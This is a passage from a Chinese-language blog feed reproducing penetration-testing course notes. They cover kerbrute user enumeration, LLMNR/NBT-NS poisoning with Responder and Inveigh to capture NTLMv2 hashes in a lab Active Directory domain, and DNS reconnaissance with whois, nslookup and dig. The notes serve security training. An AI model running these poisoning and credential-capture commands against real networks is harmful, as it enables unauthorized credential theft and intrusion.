kerbrute [command]    &lt;SNIP&gt;</code></pre><p>我们可以将该工具添加到我们的PATH中，使其可以从主机上的任何位置轻松访问。</p><h4 id="Adding-the-Tool-to-our-Path"><a href="#Adding-the-Tool-to-our-Path" class="headerlink" title="Adding the Tool to our Path"></a>Adding the Tool to our Path</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools</code></pre><h4 id="Moving-the-Binary"><a href="#Moving-the-Binary" class="headerlink" title="Moving the Binary"></a>Moving the Binary</h4><pre><code class="shell-session">sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></pre><h4 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users2021/11/17 23:01:46 &gt;  Using KDC(s):2021/11/17 23:01:46 &gt;   172.16.5.5:882021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL &lt;SNIP&gt; 2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 seconds</code></pre><h2 id="Identifying-Potential-Vulnerabilities"><a href="#Identifying-Potential-Vulnerabilities" class="headerlink" title="Identifying Potential Vulnerabilities"></a>Identifying Potential Vulnerabilities</h2><p>本地系统帐户NT AUTHORITY\system是Windows操作系统中的内置帐户。它在操作系统中具有最高级别的访问权限，用于运行大多数Windows服务。默认情况下，第三方服务在该帐户的上下文中运行也是非常常见的。加入域的主机上的SYSTEM帐户将能够通过模拟计算机帐户来枚举Active Directory，而计算机帐户本质上只是另一种用户帐户。在域环境中拥有SYSTEM级别的访问权限几乎相当于拥有域用户帐户。 有几种方法可以在主机上获得SYSTEM级别的访问权限，包括但不限于： 远程Windows漏洞利用，如MS08-067、EternalBlue或BlueKeep。 滥用在SYSTEM帐户上下文中运行的服务，或使用<a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>滥用服务帐户SeImpersonate权限。这种类型的攻击在旧的Windows操作系统上是可能的，但在Windows Server 2019上并不总是可能的。 Windows操作系统中的本地权限提升缺陷，如Windows 10任务计划程序0天。 使用本地帐户在加入域的主机上获得管理员访问权限，并使用Psexec启动SYSTEM cmd窗口 通过在加入域的主机上获得SYSTEM级别的访问权限，您将能够执行以下操作，但不限于： 使用内置工具或攻击性工具（如BloodHound和PowerView）枚举域。 在同一域内执行Kerberoasting&#x2F;ASREPRoasting攻击。 运行Inveigh等工具来收集Net-NTLMv2哈希或执行SMB中继攻击。 执行令牌模拟以劫持特权域用户帐户。 执行ACL攻击。</p><h1 id="Sniffing-out-a-Foothold"><a href="#Sniffing-out-a-Foothold" class="headerlink" title="Sniffing out a Foothold"></a>Sniffing out a Foothold</h1><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Linux"></a>LLMNR&#x2F;NBT-NS Poisoning - from Linux</h1><p>在这个阶段，我们将同时使用两种不同的技术：网络中毒和密码喷洒。我们将执行这些操作，目的是为域用户帐户获取有效的明文凭据，从而使我们在域中有一个立足点，从认证的角度开始下一阶段的枚举。</p><p>收集凭据并在评估过程中获得初步立足点的常见方法：对链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）广播的中间人攻击。根据网络的不同，此攻击可能提供低特权或管理级别的密码哈希，这些哈希可以离线破解，甚至可以是明文凭据。这些哈希有时也可用于执行SMB中继攻击，以向具有管理权限的域中的一台或多台主机进行身份验证，而无需离线破解密码哈希。</p><h2 id="LLMNR-amp-NBT-NS-Primer"><a href="#LLMNR-amp-NBT-NS-Primer" class="headerlink" title="LLMNR &amp; NBT-NS Primer"></a>LLMNR &amp; NBT-NS Primer</h2><p>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）是Microsoft Windows组件，用作DNS失败时可以使用的主机标识的替代方法。如果一台机器试图解析主机，但DNS解析失败，通常情况下，该机器会尝试通过LLMNR向本地网络上的所有其他机器询问正确的主机地址。LLMNR基于域名系统（DNS）格式，并允许同一本地链路上的主机为其他主机执行名称解析。它本机使用UDP上的端口&#x3D;&#x3D;5355&#x3D;&#x3D;。如果LLMNR失败，将使用NBT-NS。NBT-NS通过其NetBIOS名称识别本地网络上的系统。&#x3D;&#x3D;NBT-NS通过UDP利用端口137&#x3D;&#x3D;。 这里的关键是，当LLMNR&#x2F;NBT-NS用于名称解析时，网络上的任何主机都可以回复。这就是我们使用Responder来毒害这些请求的地方。通过网络访问，我们可以通过响应LLMNR和NBT-NS流量来欺骗广播域中的权威名称解析源（在这种情况下，是指应该属于网段的主机），就好像它们有请求主机的答案一样。这种中毒行为是为了让受害者通过假装我们的流氓系统知道请求主机的位置来与我们的系统通信。如果请求的主机需要名称解析或身份验证操作，我们可以捕获NetNTLM哈希，并对其进行离线暴力攻击，试图检索明文密码。捕获的身份验证请求也可以被中继以访问另一台主机，或者针对同一台主机上的不同协议（如LDAP）使用。LLMNR&#x2F;NBNS欺骗加上缺乏SMB签名，通常会导致对域内主机的管理访问。SMB中继攻击将在稍后的关于横向移动的模块中介绍。</p><h2 id="Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><a href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning" class="headerlink" title="Quick Example - LLMNR&#x2F;NBT-NS Poisoning *"></a>Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</h2><p>让我们从一个非常高的层面来简要介绍一下攻击流程的示例： 主机试图连接到位于\print01.inlanefreight.local的打印服务器，但意外键入\printer01.inlanefleight.local。 DNS服务器响应，声明此主机未知。 然后，主机向整个本地网络广播，询问是否有人知道\printer01.inlanefreight.local的位置。 攻击者（我们运行的是Responder）响应主机，指出主机正在查找\printer01.inlanefreight.local。 主机相信此回复，并使用用户名和NTLMv2密码哈希向攻击者发送身份验证请求。 如果存在正确的条件，则可以脱机破解此哈希，或将其用于SMB中继攻击。</p><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table><p>我们通常使用Linux攻击主机从客户端内部网络上的匿名位置开始进行内部渗透测试。像Responder这样的工具非常适合建立一个立足点，我们稍后可以通过进一步的枚举和攻击来扩展它。Responder是用Python编写的，通常用于Linux攻击主机，但也有适用于Windows的.exe版本。Inveigh同时使用C#和PowerShell编写（被认为是遗留版本）。这两种工具都可以用来攻击以下协议：</p><ul><li>LLMNR</li><li>DNS</li><li>MDNS</li><li>NBNS</li><li>DHCP</li><li>ICMP</li><li>HTTP</li><li>HTTPS</li><li>SMB</li><li>LDAP</li><li>WebDAV</li><li>Proxy Auth</li></ul><p>Responder also has support for:</p><ul><li>MSSQL</li><li>DCE-RPC</li><li>FTP, POP3, IMAP, and SMTP auth</li></ul><h3 id="Responder-In-Action"><a href="#Responder-In-Action" class="headerlink" title="Responder In Action *"></a>Responder In Action *</h3><p>让我们通过在控制台中键入responser-h来查看一些可用的选项。</p><p>如模块前面所示，-A标志使我们进入分析模式，使我们能够在环境中查看NBT-NS、BROWSER和LLMNR请求，而不会破坏任何响应。我们必须始终提供接口或IP。我们通常想要使用的一些常见选项是-wf；这将启动WPAD rogue代理服务器，而-f将尝试对远程主机操作系统和版本进行指纹识别。如果遇到问题，我们可以使用-v标志来增加详细程度，但这将导致大量额外的数据打印到控制台。其他选项（如-F和-P）可用于强制NTLM或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。-w标志的使用利用了内置的WPAD代理服务器。这可能非常有效，尤其是在大型组织中，因为如果浏览器启用了“自动检测”设置，它将捕获启动Internet Explorer的任何用户的所有HTTP请求。</p><p>使用上面显示的配置，响应程序将侦听并回答它在线路上看到的任何请求。如果成功并成功捕获了哈希，Responder将在屏幕上打印出来，并将其写入&#x2F;usr&#x2F;share&#x2F;resporter&#x2F;logs目录中的每个主机的日志文件中。哈希以（MODULE_NAME）-（HASH_TYPE）-（CLIENT_IP）.txt格式保存，除非启用-v模式，否则一个哈希将打印到控制台并存储在其关联的日志文件中。例如，日志文件可能类似于SMB-NTLMv2-SP-172.16.5.25。哈希也存储在SQLite数据库中，该数据库可以在Responder.conf配置文件中配置，通常位于&#x2F;usr&#x2F;share&#x2F;resporter中，除非我们直接从GitHub克隆Responder repo。 我们必须以sudo权限或root身份运行该工具，并确保攻击主机上有以下端口可用，使其发挥最佳功能：</p><pre><code class="shell-session">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</code></pre><h4 id="Responder-Logs"><a href="#Responder-Logs" class="headerlink" title="Responder Logs"></a>Responder Logs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsAnalyzer-Session.log                Responder-Session.logConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txtHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txtPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txtProxy-Auth-NTLMv2-172.16.5.200.txt</code></pre><h4 id="Starting-Responder-with-Default-Settings"><a href="#Starting-Responder-with-Default-Settings" class="headerlink" title="Starting Responder with Default Settings"></a>Starting Responder with Default Settings</h4><pre><code class="bash">sudo responder -I ens224 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309232006463.png" alt="image"></p><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Windows"></a>LLMNR&#x2F;NBT-NS Poisoning - from Windows</h1><p>本节将探讨 <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>工具，并尝试捕获另一组凭据。</p><h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2><p>工具Inveigh的工作原理与Responder类似，但使用PowerShell和C#编写。Inveigh可以监听IPv4和IPv6以及其他几种协议，包括LLMNR、DNS、mDNS、NBNS、DHCPv6、ICMPv6、HTTP、HTTPS、SMB、LDAP、WebDAV和代理身份验证。</p><h2 id="Using-Inveigh"><a href="#Using-Inveigh" class="headerlink" title="Using Inveigh"></a>Using Inveigh</h2><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\Inveigh.ps1PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters</code></pre><p>让我们从LLMNR和NBNS欺骗开始Inveigh，然后输出到控制台并写入文件。我们将保留其余的默认值，这可以在这里看到 <a href="https://github.com/Kevin-Robertson/Inveigh#parameter-help">here</a>。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y[*] Inveigh 1.506 started at 2022-02-28T19:26:30[+] Elevated Privilege Mode = Enabled[+] Primary IP Address = 172.16.5.25[+] Spoofer IP Address = 172.16.5.25[+] ADIDNS Spoofer = Disabled[+] DNS Spoofer = Enabled[+] DNS TTL = 30 Seconds[+] LLMNR Spoofer = Enabled[+] LLMNR TTL = 30 Seconds[+] mDNS Spoofer = Disabled[+] NBNS Spoofer For Types 00,20 = Enabled[+] NBNS TTL = 165 Seconds[+] SMB Capture = Enabled[+] HTTP Capture = Enabled[+] HTTPS Certificate Issuer = Inveigh[+] HTTPS Certificate CN = localhost[+] HTTPS Capture = Enabled[+] HTTP/HTTPS Authentication = NTLM[+] WPAD Authentication = NTLM[+] WPAD NTLM Authentication Ignore List = Firefox[+] WPAD Response = Enabled[+] Kerberos TGT Capture = Disabled[+] Machine Account Capture = Disabled[+] Console Output = Full[+] File Output = Enabled[+] Output Directory = C:\ToolsWARNING: [!] Run Stop-Inveigh to stop[*] Press any key to stop console outputWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listenerWARNING: [!] [2022-02-28T19:26:31] Exception calling &quot;Start&quot; with &quot;0&quot; argument(s): &quot;An attempt was made to access asocket in a way forbidden by its access permissions&quot; $HTTP_listener.Start()[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834&lt;SNIP&gt;</code></pre><p>我们可以看到，我们立即开始获取LLMNR和mDNS请求。下面的动画显示了该工具的作用。</p><p><img src="https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png" alt="image"></p><h2 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h2><p>Invenigh的PowerShell版本是原始版本，不再更新。工具作者维护C#版本，该版本结合了原始PoC C#代码和PowerShell版本中大部分代码的C#端口。在我们可以使用C#版本的工具之前，我们必须编译可执行文件</p><pre><code class="powershell-session">PS C:\htb&gt; .\Inveigh.exe</code></pre><pre><code class="powershell-session">[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276][+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Listener Addresses [IP 0.0.0.0 | IPv6 ::][+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Spoofer Options [Repeat Enabled | Local Attacks Disabled][ ] DHCPv6[+] DNS Packet Sniffer [Type A][ ] ICMPv6[+] LLMNR Packet Sniffer [Type A][ ] MDNS[ ] NBNS[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80][ ] HTTPS[+] WebDAV [WebDAVAuth NTLM][ ] Proxy[+] LDAP Listener [Port 389][+] SMB Packet Sniffer [Port 445][+] File Output [C:\Tools][+] Previous Session Files (Not Found)[*] Press ESC to enter/exit interactive console[!] Failed to start HTTP listener on port 80, check IP and port usage.[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]</code></pre><p>正如我们所看到的，该工具启动并显示哪些选项默认启用，哪些选项未启用。带[+]的选项是默认的，默认情况下是启用的，之前带[]的选项是禁用的。正在运行的控制台输出还向我们显示了哪些选项被禁用，因此不会发送响应（上例中为mDNS）。我们还可以看到消息Press ESC to enter&#x2F;exit interactive console，这在运行该工具时非常有用。控制台允许我们访问捕获的凭据&#x2F;哈希，允许我们停止Inveigh等。</p><p>我们可以在Inveigh运行时按esc键进入控制台。</p><pre><code class="powershell-session">&lt;SNIP&gt;[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP</code></pre><p>在键入HELP并点击enter后，我们将看到几个选项：</p><pre><code class="powershell-session">=============================================== Inveigh Console Commands ===============================================Command                           Description========================================================================================================================GET CONSOLE                     | get queued console outputGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addressesGET LOG                         | get log entries; add search string to filter resultsGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter resultsGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter resultsGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter resultsGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter resultsGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashesGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashesGET CLEARTEXT                   | get captured cleartext credentialsGET CLEARTEXTUNIQUE             | get unique captured cleartext credentialsGET REPLYTODOMAINS              | get ReplyToDomains parameter startup valuesGET REPLYTOHOSTS                | get ReplyToHosts parameter startup valuesGET REPLYTOIPS                  | get ReplyToIPs parameter startup valuesGET REPLYTOMACS                 | get ReplyToMACs parameter startup valuesGET IGNOREDOMAINS               | get IgnoreDomains parameter startup valuesGET IGNOREHOSTS                 | get IgnoreHosts parameter startup valuesGET IGNOREIPS                   | get IgnoreIPs parameter startup valuesGET IGNOREMACS                  | get IgnoreMACs parameter startup valuesSET CONSOLE                     | set Console parameter valueHISTORY                         | get command historyRESUME                          | resume real time console outputSTOP                            | stop Inveigh</code></pre><p>我们可以通过键入GET NTLMV2UNIQUE快速查看捕获的唯一哈希。</p><p>我们可以键入GET NTLMV2USERNAMES并查看我们收集了哪些用户名。如果我们想要一个用户列表来执行额外的枚举，并查看哪些值得尝试使用Hashcat离线破解，这将非常有用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Information Gathering</title>
      <link href="/2023/09/18/Information-Gathering/"/>
      <url>/2023/09/18/Information-Gathering/</url>
      
        <content type="html"><![CDATA[<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><p>信息收集阶段是每次渗透测试的第一步，我们需要在没有目标组织内部信息的情况下模拟外部攻击者。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181613272.png" alt="img"></p><span id="more"></span><p>例如，我们可以将其视为在基于SSL证书的渗透测试中偶然发现新子域。然而，如果我们仔细观察这些子域，我们经常会看到与主要公司网站不同的技术在使用。子域和vhosts用于呈现其他信息，并执行与主页分离的其他任务。因此，必须了解使用了哪些技术，它们有什么用途，以及它们是如何工作的。在此过程中，我们的目标是从以下领域尽可能多地识别信息：</p><ul><li>域和子域</li><li>IP范围</li><li>基础设施</li><li>虚拟主机</li></ul><h1 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h1><p> <a href="https://en.wikipedia.org/wiki/WHOIS">WHOIS</a>域查找允许我们检索已注册域的域名信息。互联网名称与数字地址分配机构（ICANN）要求经认证的注册商在注册域名后立即在Whois数据库中输入持有人的联系信息、域名的创建和有效期以及其他信息。简单地说，Whois数据库是目前全球注册的所有域名的可搜索列表。 WHOIS查找最初是使用命令行工具执行的。如今，存在许多基于web的工具，但命令行选项通常使我们能够最大限度地控制查询，并帮助过滤和排序结果输出。Sysinternals WHOIS for Windows或Linux WHOIS命令行实用程序是我们收集信息的首选工具。然而，我们也可以使用一些在线版本，如 <a href="https://whois.domaintools.com/">whois.domaintools.com</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ whois $TARGET</code></pre><p>从这个输出中，我们收集了以下信息：</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="Nslookup-amp-DIG"><a href="#Nslookup-amp-DIG" class="headerlink" title="Nslookup &amp; DIG"></a>Nslookup &amp; DIG</h2><p>我们来看看Nslookup命令行实用程序。让我们假设一位客户要求我们进行外部渗透测试。因此，我们首先需要熟悉它们的基础设施，并确定哪些主机是可以公开访问的。我们可以使用不同类型的DNS请求来找到这一点。使用Nslokup，我们可以在互联网上搜索域名服务器，并向他们询问有关主机和域的信息。尽管该工具有两种模式，交互式和非交互式，但我们将主要关注非交互式模块。 我们只需提交域名就可以查询A记录。但是我们也可以使用-query参数来搜索特定的资源记录。例如：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:Name:facebook.comAddress: 31.13.92.36Name:facebook.comAddress: 2a03:2880:f11c:8083:face:b00c:0:25de</code></pre><p>如果需要，我们还可以通过在命令中添加@&lt;nameserver&#x2F;IP&gt;来指定名称服务器。与nslookup不同，DIG向我们展示了一些更重要的信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58899;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      A;; ANSWER SECTION:facebook.com.           169     IN      A       31.13.92.36;; Query time: 20 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:03:17 CEST 2021;; MSG SIZE  rcvd: 57</code></pre><p>条目以完整的域名开始，包括最后一个点。在必须再次请求信息之前，该条目可以在高速缓存中保持169秒</p><h4 id="Querying-A-Records-for-a-Subdomain"><a href="#Querying-A-Records-for-a-Subdomain" class="headerlink" title="Querying: A Records for a Subdomain"></a>Querying: A Records for a Subdomain</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=www.facebook.comTanin@htb[/htb]$ nslookup -query=A $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:www.facebook.comcanonical name = star-mini.c10r.facebook.com.Name:star-mini.c10r.facebook.comAddress: 31.13.92.36</code></pre><p>Querying: A Records for a Subdomain</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig a www.facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; a www.facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15596;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;www.facebook.com.              IN      A;; ANSWER SECTION:www.facebook.com.       3585    IN      CNAME   star-mini.c10r.facebook.com.star-mini.c10r.facebook.com. 45 IN      A       31.13.92.36;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:11:48 CEST 2021;; MSG SIZE  rcvd: 90</code></pre><h4 id="Querying-PTR-Records-for-an-IP-Address"><a href="#Querying-PTR-Records-for-an-IP-Address" class="headerlink" title="Querying: PTR Records for an IP Address"></a>Querying: PTR Records for an IP Address</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup -query=PTR 31.13.92.36Server:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:36.92.13.31.in-addr.arpaname = edge-star-mini-shv-01-frt3.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig -x 31.13.92.36 @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; -x 31.13.92.36 @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51730;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;36.92.13.31.in-addr.arpa.      IN      PTR;; ANSWER SECTION:36.92.13.31.in-addr.arpa. 1028  IN      PTR     edge-star-mini-shv-01-frt3.facebook.com.;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:14:20 CEST 2021;; MSG SIZE  rcvd: 106</code></pre><h4 id="Querying-ANY-Existing-Records"><a href="#Querying-ANY-Existing-Records" class="headerlink" title="Querying: ANY Existing Records"></a>Querying: ANY Existing Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;google.com&quot;Tanin@htb[/htb]$ nslookup -query=ANY $TARGETServer:10.100.0.1Address:10.100.0.1#53Non-authoritative answer:Name:google.comAddress: 172.217.16.142Name:google.comAddress: 2a00:1450:4001:808::200egoogle.comtext = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;google.comtext = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;google.comtext = &quot;v=spf1 include:_spf.google.com ~all&quot;google.comtext = 